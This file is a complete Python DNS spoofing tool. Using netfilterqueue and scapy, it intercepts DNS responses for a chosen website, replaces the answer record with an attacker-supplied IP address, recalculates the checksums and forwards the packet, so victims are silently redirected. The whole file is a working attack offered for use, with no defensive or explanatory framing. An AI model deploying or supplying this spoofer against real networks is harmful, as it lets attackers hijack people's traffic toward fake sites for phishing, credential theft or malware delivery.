#!/usr/bin/env python

import netfilterqueue 
import scapy.all as scapy
import argparse

def get_args(): 
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website", help="Specifiy the website to spoof")
    parser.add_argument("-r", "--redirect", dest="redirect", help="Specifiy where the target will be redirected to")
    options = parser.parse_args()
    if options.website:
        return options
    else:
        parser.error("[-] Please specifiy a website to spoof and the IP address to redirect the target to, use --help for more details")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet [scapy.DNSQR].qname
        if website in qname.decode(): 
            print(f"[+] Spoofing Target: {qname}")
            answer = scapy.DNSRR(rrname=qname, rdata=redirect)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
            print("[+] Packet Modified and Redirected!")
       
    packet.accept()
    
queue = netfilterqueue.NetfilterQueue()
website = get_args().website
redirect = get_args().redirect
queue.bind(1, process_packet)

try:
    print(f"[+] Starting DNS Spoofer...")
    print(f"[INFO] Spoofing '{website}' and redirecting to '{redirect}'")
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected Interrupt. Exiting...")
    queue.unbind()